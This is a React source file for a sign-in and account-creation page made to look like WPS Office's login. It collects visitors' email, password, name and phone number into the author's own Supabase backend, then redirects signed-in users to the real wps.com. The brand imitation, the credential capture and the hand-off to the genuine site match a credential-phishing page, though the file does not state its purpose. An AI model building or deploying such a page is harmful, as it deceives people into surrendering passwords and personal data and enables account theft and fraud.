import { useState } from "react";
import { createClient } from "@supabase/supabase-js";

const supabase = createClient(
  import.meta.env.VITE_SUPABASE_URL,
  import.meta.env.VITE_SUPABASE_ANON_KEY
);

const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

function App() {
  const [view, setView] = useState("login");
  const [email, setEmail] = useState("");
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const [error, setError] = useState("");
  const [signedInUser, setSignedInUser] = useState(null);

  const openView = (nextView) => {
    setView(nextView);
    setMessage("");
    setError("");
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    setMessage("");
    setError("");

    const normalizedEmail = email.trim().toLowerCase();
    const normalizedPhone = phone.replace(/\D/g, "").slice(0, 11);

    if (!emailPattern.test(normalizedEmail)) {
      setError("Enter a valid email address.");
      return;
    }

    setLoading(true);

    try {
      const result = view === "signup"
        ? await supabase.auth.signUp({ email: normalizedEmail, password, options: { data: { name: name.trim(), phone: normalizedPhone } } })
        : await supabase.auth.signInWithPassword({ email: normalizedEmail, password });

      if (result.error) {
        setError(result.error.message);
        return;
      }

      if (view === "signup") {
        setView("login");
        setMessage("Account created successfully. Please sign in.");
        setName("");
        setPhone("");
        setPassword("");
      } else {
        window.location.assign("https://www.wps.com/");
      }
    } catch (requestError) {
      setError(requestError.message || "Unable to save your account.");
    } finally {
      setLoading(false);
    }
  };

  if (signedInUser) {
    return (
      <div className="result-page">
        <div className="result-card">
          <div className="warning-icon">✓</div>
          <h1>{message || "Welcome"}</h1>
          <p>{signedInUser.email}</p>
          <button onClick={async () => { await supabase.auth.signOut(); setSignedInUser(null); setView("login"); setEmail(""); setName(""); setPhone(""); }}>CONTINUE</button>
        </div>
      </div>
    );
  }

  return (
    <div className="page">
      <aside className="brand-panel">
        <div className="brand-lockup">
          <div className="wps-mark" aria-hidden="true"><span>W</span></div>
          <strong>WPS Office</strong>
        </div>
        <div className="brand-art" aria-hidden="true">
          <div className="art-shape art-shape-one" />
          <div className="art-shape art-shape-two" />
          <div className="art-shape art-shape-three" />
        </div>
      </aside>

      <main className="signin-panel">
        <button className="language-button" type="button">English <span>⌄</span></button>
        <section className="signin-card">
          <h1>Sign In</h1>
          <form className="email-form" onSubmit={handleSubmit}>
              <label htmlFor="email">Email</label>
              <input id="email" type="email" autoComplete="email" placeholder="Enter your email" value={email} onChange={(event) => setEmail(event.target.value)} required />
              <label htmlFor="password">Password</label>
              <input id="password" type="password" placeholder="Enter your password" value={password} onChange={(event) => setPassword(event.target.value)} minLength="6" required />
              {error && <p className="form-error" role="alert">{error}</p>}
              {message && <p className="form-message" role="status">{message}</p>}
              <button className="continue-button" type="submit" disabled={loading}>{loading ? "PLEASE WAIT..." : "SIGN IN"}</button>
              <p className="auth-switch">New to WPS Office? <button type="button" onClick={() => openView("signup")}>Create an account</button></p>
          </form>
              <a className="official-site-link" href="https://www.wps.com/" target="_blank" rel="noreferrer">Visit the official WPS website</a>

          <div className="utility-links" aria-hidden="true"><span>f</span><span>SSO</span><span>•••</span></div>
        </section>
      </main>

      {view === "signup" && (
        <div className="modal-backdrop" role="presentation" onMouseDown={(event) => { if (event.target === event.currentTarget) openView("login"); }}>
          <section className="signup-modal" role="dialog" aria-modal="true" aria-labelledby="signup-title">
            <button className="modal-close" type="button" aria-label="Close create account dialog" onClick={() => openView("login")}>×</button>
            <h2 id="signup-title">Create an Account</h2>
            <form className="email-form" onSubmit={handleSubmit}>
              <label htmlFor="name">Name</label>
              <input id="name" type="text" placeholder="Enter your name" value={name} onChange={(event) => setName(event.target.value)} required />
              <label htmlFor="phone">Phone number</label>
              <input id="phone" type="tel" inputMode="numeric" autoComplete="tel" placeholder="09XXXXXXXXX" value={phone} maxLength="11" onChange={(event) => setPhone(event.target.value.replace(/\D/g, "").slice(0, 11))} required />
              <label htmlFor="signup-email">Email</label>
              <input id="signup-email" type="email" autoComplete="email" placeholder="Enter your email" value={email} onChange={(event) => setEmail(event.target.value)} required />
              <label htmlFor="signup-password">Password</label>
              <input id="signup-password" type="password" placeholder="Create a password" value={password} onChange={(event) => setPassword(event.target.value)} minLength="6" required />
              {error && <p className="form-error" role="alert">{error}</p>}
              {message && <p className="form-message" role="status">{message}</p>}
              <button className="continue-button" type="submit" disabled={loading}>{loading ? "PLEASE WAIT..." : "CREATE ACCOUNT"}</button>
            </form>
          </section>
        </div>
      )}
    </div>
  );
}

export default App;
